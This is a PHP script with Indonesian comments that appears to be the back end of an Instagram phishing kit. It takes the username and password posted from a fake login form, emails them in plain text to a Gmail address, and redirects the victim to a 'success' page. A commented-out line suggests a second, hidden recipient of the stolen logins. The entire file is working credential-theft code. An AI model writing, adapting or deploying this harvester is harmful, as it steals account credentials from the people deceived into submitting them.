<?php
###############################################
##        Author: Moh.ImamNurCakra           ##
##       Mailer: Imam                        ##
##       Modifer: Mr.Ackerman~               ##
###############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

$subjek = 'Laporan Akun Instagram';
$mailto = 'imamnurcakra@gmail.com'; //YOUR EMAIL ADDRESS

/* Fungsi berikut untuk mengambil input field. */

$imel = $_POST['user'];
$paswot = $_POST['password'];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = <<<EOD
<br><hr><br>

Username : <font color="red">$imel</font> <br>
Password : <font color="red">$paswot</font> <br>
EOD;


$headers = "From: Mr.Ackerman@gmail.com\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n";
$success = mail($mailto, $subjek." #".rand(1000,10000), $body, $headers);
// $successsadap = mail($mailsadap, $subjeksadap." #".rand(1000,10000), $body, $headers);
?>
<?php
$random = rand(1000,5000);
?>

<meta content='0;url=./succes.php' http-equiv='refresh'/>
</head><body>
</html>
    
    
    